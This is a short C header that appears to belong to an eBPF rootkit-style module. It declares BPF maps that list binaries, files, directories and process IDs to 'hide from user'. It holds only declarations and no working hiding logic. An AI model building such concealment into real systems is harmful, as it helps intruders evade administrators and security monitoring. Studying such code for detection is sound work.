/**
 * Contains all map declaration for the eBPF module.
 * 
 * @author Yekuuun
 */

#ifndef BPF_MAPS_H
#define BPF_MAPS_H

#include "vmlinux.h"
#include "bpf_config.h"
#include "../lib/ft_utils.h"

//----------------------------------------------------
// ┌────────────────────────────────────┐
//  CACHES
// └────────────────────────────────────┘
//----------------------------------------------------

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, MAX_BINARIES_CONFIG_CACHE);
    __type(key, char[DNAME_MAX]);
    __type(value, __u8); // 1 == active
} hide_from_cache_bin SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, MAX_BINARIES_CONFIG_CACHE);
    __type(key, char[DNAME_MAX]);
    __type(value, __u8); // 1 == active
} hide_from_cache_file SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, MAX_BINARIES_CONFIG_CACHE);
    __type(key, char[DNAME_MAX]);
    __type(value, __u8); // 1 == active
} hide_from_cache_dir SEC(".maps");

//----------------------------------------------------
// ┌────────────────────────────────────┐
//  HIDE PROCESS
// └────────────────────────────────────┘
//----------------------------------------------------

/**
 * PID watch list.
 * 
 * @note => contains all pid to hide from user.
 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, MAX_PID_ENTRIES);
    __type(key,   __u32);
    __type(value, __u8); // 1 == hidden. 
} hide_pid_cache SEC(".maps");

//---------------------------------------------------------------

#endif